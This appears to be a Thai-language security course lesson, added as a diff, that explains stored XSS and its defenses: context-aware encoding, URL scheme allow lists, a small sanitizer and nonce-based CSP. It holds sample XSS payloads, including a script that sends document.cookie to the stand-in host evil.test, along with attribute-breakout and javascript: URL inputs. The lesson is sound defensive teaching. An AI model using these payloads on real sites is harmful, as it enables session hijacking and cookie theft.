@@ -1,0 +1,143 @@
+---
+title: XSS และ CSP
+summary: ความเห็นของลูกค้าที่มี Script ปนมาถูกเสิร์ฟให้ลูกค้าคนอื่น เราใช้ Parser ของ HTML จริงดูว่า Browser สร้าง Element ที่ไม่มีใครเขียนขึ้นมาอย่างไร ทั้งในเนื้อหา, ใน Attribute และในบล็อก Script แล้วดูว่าการ Encode ที่ตรงกับที่ กับ Allow List ของ URL และ Content Security Policy แบบมี Nonce ช่วยกันคนละส่วน
+facts:
+  - "รันจริงใน exercises/09_xss.py: ใช้ html.parser ของ Python สร้างผลว่าหน้านั้นมี Element หรือ Event Attribute ที่ไม่มีใครเขียนไหม ทั้งแบบ Encode และไม่ Encode ใน 3 ตำแหน่ง รวม 12 กรณีในแล็บ"
+  - "ผลของ Content Security Policy เป็นโมเดลของกฎ (nonce, unsafe-inline) ที่เขียนในแบบฝึก ไม่ได้ลองกับ Browser จริง และ Script ไม่ได้ถูกรันจริงในแบบฝึก"
+  - "หนังสือที่ใช้คือ Web Application Security บทที่ 10 และ 22 ที่ไม่ได้รัน คือ DOM-based XSS และ Mutation XSS ซึ่งขึ้นกับ Browser"
+order: 9
+phase: C
+level: 3
+stage: sprout
+format: steps
+requires: [injection]
+updated: 2026-11-18
+---
+
+import Step from '../../../../components/Step.astro';
+import Callout from '../../../../components/Callout.astro';
+import Question from '../../../../components/Question';
+import XssLab from '../../../../components/labs/app-security/XssLab';
+
+<Step>
+
+## ความเห็นที่มี Script ปนมา
+
+ร้านของนาย A มีหน้ารีวิวสินค้า ลูกค้าพิมพ์ความเห็น แล้วหน้าเว็บเอาไปแสดงให้คนอื่นเห็น (รัน: `exercises/09_xss.py`)
+
+```python
+def page_naive(comment):
+    return f"<html><body><h1>Reviews</h1><p>{comment}</p></body></html>"
+
+COMMENT = '<script>fetch("https://evil.test/?c="+document.cookie)</script>'
+```
+
+ถ้ามีคนพิมพ์ความเห็นเป็นบรรทัดข้างบน HTML ที่ได้จะมี `<script>` อยู่ในย่อหน้า พอ Browser ของลูกค้าคนถัดไปเปิดหน้านี้ มันไม่รู้ว่า Script นั้นมาจากความเห็น มันเห็นเป็นส่วนหนึ่งของหน้าเว็บของร้าน และรันด้วยสิทธิ์ของเว็บร้านนั้น ซึ่งอ่าน Cookie ที่ไม่มี `HttpOnly` ได้ตามที่เราเห็นในบทที่เกี่ยวกับ Session นี่คือ **XSS (Cross-Site Scripting)** แบบ Stored เพราะความเห็นถูกเก็บไว้แล้วเสิร์ฟให้ทุกคน (หนังสือ: Web Application Security บทที่ 10 หน้า 121)
+
+เราไม่มี Browser จริงในแบบฝึกนี้ จึงให้ Parser ของ HTML จาก Python ซึ่งสร้างเหตุการณ์ชนิดเดียวกับที่ Browser สร้าง (Tag เริ่มต้นกับ Attribute) มาดูแทน ผลที่ได้คือหน้าแบบเดิมมี Element `script` เพิ่มขึ้นมาที่ไม่มีใครเขียน ส่วนอีกแบบที่ผ่าน `html.escape` ไม่มี
+
+ต้นเหตุเหมือน[บทที่แล้ว](/app-security/injection/) ข้อความของผู้ใช้กลายเป็นโค้ด ครั้งนี้ผู้อ่านคือ Browser ที่เปิดหน้าเว็บ และวิธีแก้ก็ตามหลักเดียวกัน คือ **Encode ตอนแสดงผล** ให้ข้อความยังเป็นข้อความ
+
+</Step>
+
+<Step>
+
+## Encode ให้ตรงกับที่ที่ข้อความไปอยู่
+
+`html.escape` เปลี่ยน `< > & " '` เป็น `&lt; &gt; &amp; &quot; &#x27;` แบบฝึก Assert ว่าได้ตามนั้น เมื่อใช้กับเนื้อหาของย่อหน้า Script ไม่ถูกสร้าง และตัวความเห็นก็ยังแสดงให้ผู้ใช้เห็นเป็นข้อความตามที่พิมพ์
+
+แต่การ Encode ที่ถูกต้องขึ้นกับว่าข้อความไปอยู่ **ที่ไหน** ของหน้า ลองเลือกทีละตำแหน่งในแล็บข้างล่าง ใช้ข้อความโจมตีของตำแหน่งนั้น แล้วสลับ Encode ระหว่างไม่ทำกับทำให้ตรงที่ ดูว่า Browser สร้างอะไรขึ้นมาไม่เหมือนกันทั้งสามตำแหน่ง ส่วนที่ไฮไลต์ในหน้าคือข้อความของผู้ใช้
+
+<XssLab client:visible />
+
+ตำแหน่งแรกคือเนื้อหา HTML ซึ่งข้างบนคือกรณีง่ายที่สุด ตำแหน่งที่สองคือค่าของ Attribute ที่มีเครื่องหมาย `"` ครอบอยู่ ข้อความโจมตี `" onfocus="alert(1)" autofocus="` ปิดค่าด้วยเครื่องหมาย `"` ตัวแรก ทำให้ `onfocus` กลายเป็น Attribute ใหม่ของ `<input>` จริง ๆ ส่วน `html.escape` แปลง `"` เป็น `&quot;` ค่าจึงไม่ถูกปิดก่อนเวลา แบบฝึกยังเช็กด้วยว่าถ้าไม่มีเครื่องหมาย `"` ครอบค่า Attribute ช่องว่างตัวเดียวก็ปิดค่าได้ `html.escape` อย่างเดียวจึงไม่พอ ต้องใส่เครื่องหมายครอบเสมอ
+
+ตำแหน่งที่สามคือค่าที่ใส่ในบล็อก `<script>` ตรงนี้ `html.escape` ใช้ไม่ได้ผลตามที่เราคิด เพราะ Browser อ่านเนื้อใน `<script>` เป็น JavaScript ไม่ใช่ HTML ที่ต้องถอดรหัสก่อน ทางที่ถูกคือเขียนค่าเป็นสตริงของ JavaScript ด้วย `json.dumps` และเขียน `<` เป็น `\u003c` ด้วย เพราะข้อความ `</script>` ในสตริงจะปิดบล็อกก่อนเวลาแม้อยู่ในเครื่องหมายคำพูด แบบฝึกลองค่า `</script><img src=x onerror=alert(1)>` Parser เห็น `<img onerror=...>` โผล่ออกมาเมื่อไม่ได้เขียน `<` เป็น `\u003c` แต่ไม่เห็นเมื่อเขียน (หนังสือ: Web Application Security บทที่ 22 หน้า 240 เรื่อง HTML Entity Encoding)
+
+</Step>
+
+<Step kind="question">
+
+<Question
+  client:visible
+  q="ทีมใช้ html.escape กับค่าที่ใส่ในบล็อก <Script> ของหน้า เพราะ Escape แล้วปลอดภัย ข้อไหนอธิบายได้ถูกที่สุด"
+  options={['ปลอดภัย เพราะ html.escape ป้องกัน XSS ได้ทุกตำแหน่ง', 'ไม่แน่ เพราะการ Encode ต้องตรงกับตำแหน่ง ในบล็อก Script เนื้อหาถูกอ่านเป็น JavaScript ควรเขียนค่าด้วย json.dumps และ Escape ตัว <', 'ปลอดภัย ถ้าค่ามีแต่ตัวเลข']}
+  answer={1}
+  why="ในหน้า HTML เดียวกันมีหลายบริบท (เนื้อหา, Attribute, Script, URL) และแต่ละบริบทมีอักขระที่ทำให้ข้อความหลุดออกมา ซึ่งไม่เหมือนกัน แบบฝึกเห็นผลต่างตรง ๆ ในแล็บ ตำแหน่ง js ที่ไม่ได้เขียน `<` เป็น `\u003c` ทำให้ Parser เห็น Img ที่มี Onerror ข้อความสุดท้ายที่ว่าถ้ามีแต่ตัวเลขก็ปลอดภัยเป็นความจริงในทางปฏิบัติ แต่ต้องมั่นใจว่าตรวจชนิดของค่าที่ฝั่ง Server จริง ๆ"
+/>
+
+</Step>
+
+<Step>
+
+## ลิงก์ที่ Escape แล้วก็ยังรันได้
+
+มีอีกกรณีที่ Encode ไม่ช่วยเลย คือ URL ในลิงก์ ถ้าผู้ใช้ใส่ที่อยู่เว็บส่วนตัวของตัวเองในโปรไฟล์ แล้วเราทำเป็น `<a href="...">` ผู้ใช้อาจใส่ `javascript:alert(document.cookie)` ซึ่งไม่มีอักขระที่ `html.escape` แปลงเลย แบบฝึกเช็กว่า `href` ที่ได้ยังเป็น `javascript:...` อยู่ครบ จึงยังเป็นลิงก์ที่รัน Script เมื่อถูกกด
+
+ทางแก้ที่ใช้ได้คือ **Allow List** ของ Scheme ในแบบฝึกอนุญาตเฉพาะ `http`, `https` และลิงก์สัมพัทธ์ (ไม่มี Scheme) ลิงก์ `javascript:` ถูกปฏิเสธ รวมถึงรูปแบบที่เขียนด้วยตัวใหญ่และมีช่องว่างข้างหน้า (`  JaVaScRiPt:alert(1)`) ที่ Browser อ่านออกเหมือนเดิม (หนังสือ: Web Application Security บทที่ 22 หน้า 239 เรื่อง Sanitizing Hyperlinks)
+
+</Step>
+
+<Step>
+
+## ถ้าต้องให้ผู้ใช้ใส่ HTML ได้บางส่วน
+
+บางเว็บต้องการให้ผู้ใช้เขียนตัวหนา `<b>` ได้ ตรงนี้การ Encode ทั้งหมดไม่พอ เพราะเราอยากให้ `<b>` ทำงาน ทางที่ใช้คือ **Sanitizer แบบ Allow List** แบบฝึกเขียนตัวเล็ก ๆ ที่เก็บเฉพาะ `<b>` กับ `<i>` และทิ้ง Attribute ทุกตัว ข้อความที่ผู้ใช้ส่งเข้ามามี `<b onclick="x()">` กับ `<img onerror=...>` และ `<script>` ผลคือเหลือ `<b>shop</b>` ไม่มี Event Attribute เหลือเลย
+
+ข้อควรระวังที่แบบฝึกเช็กเองคือ ข้อความภายใน `<script>alert(2)</script>` ที่ถูกทิ้ง Tag ไปแล้วยังเหลือเป็นข้อความธรรมดา `alert(2)` ซึ่งไม่รัน แต่ก็แสดงว่า Sanitizer ที่เขียนเองจะมีกรณีแปลก ๆ หลุดอยู่เสมอ ในงานจริง เราใช้ Sanitizer ที่คนดูแลต่อเนื่อง และเรื่องที่ยากกว่านั้นอย่าง Mutation XSS ที่ Browser แก้ HTML ที่เสียให้กลายเป็นอันตราย (หนังสือ: Web Application Security บทที่ 10 หน้า 128) ผู้เขียนไม่ได้รันในบทนี้
+
+</Step>
+
+<Step>
+
+## กำแพงอีกชั้น: Content Security Policy
+
+ทุกกฎข้างบนต้องไม่พลาดเลยแม้แต่ที่เดียว **CSP** คือกำแพงอีกชั้น Server ส่ง Header ที่บอก Browser ว่า Script จากที่ไหนรันได้ ถ้า Script ที่ถูกฝังมาไม่ตรงเงื่อนไข Browser ไม่รัน
+
+```text
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-ulO-UaueGw7spEFMRaC5GQ'; object-src 'none'
+```
+
+`nonce` คือค่าสุ่มที่ Server สร้างใหม่ในทุก Response และใส่ใน `<script nonce="...">` ของเราเอง Script ที่ฝังมาโดยผู้โจมตีไม่มี Nonce ที่ถูกต้อง จึงไม่ถูกรัน ผลที่แบบฝึก Assert ด้วยโมเดลของกฎ Script ของเราที่มี Nonce รันได้ Script ที่ฝังมาโดยไม่มี Nonce ถูกบล็อก ผู้โจมตีที่เดา Nonce จากหน้าเก่าก็ไม่ผ่านเพราะค่าเปลี่ยนทุก Response (Nonce ยาว 22 ตัวอักษร หรือ 128 บิต) แต่ถ้านโยบายมี `'unsafe-inline'` โดยไม่มี Nonce Script ที่ฝังมารันได้อีก สลับตัวเลือก CSP ในแล็บเมื่อกี้ดูได้ (หนังสือ: Web Application Security บทที่ 22 หน้า 242)
+
+CSP เป็นชั้นสำรอง ไม่ใช่ตัวแทนของการ Encode ถ้าเราพึ่งมันอย่างเดียว ข้อความของผู้ใช้ก็ยังกลายเป็น HTML ที่ฝังมาในหน้าอยู่ดี ตัวที่ Script ยังรันไม่ได้แค่นั้นเอง
+
+<Callout type="warn" title="ผลของ CSP ในแบบฝึกเป็นโมเดล">
+
+แบบฝึกไม่มี Browser จริง ส่วนที่เป็นกฎของ Nonce กับ Unsafe-inline เขียนเป็นโค้ดจากสิ่งที่หนังสือและเอกสารอธิบาย ผลที่ได้บอกว่า ถ้า Browser ทำตามกฎนี้ ผลจะเป็นอย่างนี้ ไม่ได้ยืนยันกับ Chrome หรือ Firefox
+
+</Callout>
+
+</Step>
+
+<Step kind="question">
+
+<Question
+  client:visible
+  q="เว็บมี CSP แบบ Nonce อยู่แล้ว ทีมเลยเลิกใส่ html.escape กับความเห็นของผู้ใช้ เพราะ Script ที่ฝังก็รันไม่ได้อยู่ดี ข้อไหนถูกต้อง"
+  options={['ถูก เพราะ CSP ปลอดภัยพอแล้ว', 'ไม่ควร เพราะ CSP เป็นชั้นสำรอง ข้อความของผู้ใช้ที่กลายเป็น HTML ยังทำสิ่งอื่นได้ เช่นแทรกฟอร์มปลอมหรือแก้หน้า และ CSP อาจตั้งค่าผิดได้', 'ถูก ถ้า CSP มี unsafe-inline']}
+  answer={1}
+  why="เป้าหมายคือไม่ให้ข้อความของผู้ใช้เป็น HTML ในที่ที่เราไม่ได้ตั้งใจ ซึ่ง Encode ทำที่ต้นเหตุ CSP กันเฉพาะสิ่งที่นโยบายพูดถึง และพังได้เมื่อตั้งค่าผิด เช่นเพิ่ม Unsafe-inline เข้ามาแล้วนโยบายก็ปล่อยให้ Script ที่ฝังรันได้อีก ซึ่งแบบฝึกเห็นผลต่างตรง ๆ"
+/>
+
+</Step>
+
+<Step>
+
+## ที่มาของบทนี้
+
+| ข้อความ | ที่มา |
+|---|---|
+| หน้าที่ต่อความเห็นตรง ๆ มี Element `script` ที่ไม่มีใครเขียน และหน้าที่ผ่าน `html.escape` ไม่มี | รัน: `exercises/09_xss.py` (Parser ของ Python ไม่ใช่ Browser จริง) |
+| `html.escape` แปลง `< > & " '` ตามที่ระบุ | รัน: `exercises/09_xss.py` |
+| ค่าที่ปิด Attribute ด้วย `"` สร้าง Event Attribute ใหม่ และ `html.escape` กันได้เมื่อค่าอยู่ใน `"` | รัน: `exercises/09_xss.py` |
+| ค่าในบล็อก Script ที่มี `</script>` หลุดออกมา ถ้าไม่เขียน `<` เป็น `\u003c` | รัน: `exercises/09_xss.py` |
+| HTML Entity Encoding | หนังสือ: Web Application Security บทที่ 22 หน้า 240 |
+| ลิงก์ `javascript:` ผ่าน `html.escape` ไปได้ และ Allow List ของ Scheme กันได้ | รัน: `exercises/09_xss.py` และหนังสือ: Web Application Security บทที่ 22 หน้า 239 |
+| Sanitizer แบบ Allow List เก็บ `<b>` ทิ้ง Attribute และ Element อื่น | รัน: `exercises/09_xss.py` |
+| Stored XSS และ Mutation XSS | หนังสือ: Web Application Security บทที่ 10 หน้า 121 และ 128 (Mutation ไม่ได้รัน) |
+| CSP แบบ Nonce ให้ Script ของเรารัน บล็อกตัวที่ฝัง และ Unsafe-inline ทำให้รันได้อีก | รัน: `exercises/09_xss.py` (โมเดลของกฎ) และหนังสือ: Web Application Security บทที่ 22 หน้า 242 |
+| Browser ทำตามกฎ CSP ตามโมเดลจริงหรือไม่ | ไม่ได้รันกับ Browser จริง |
+| DOM-based XSS | ไม่ได้รัน |
+
+</Step>
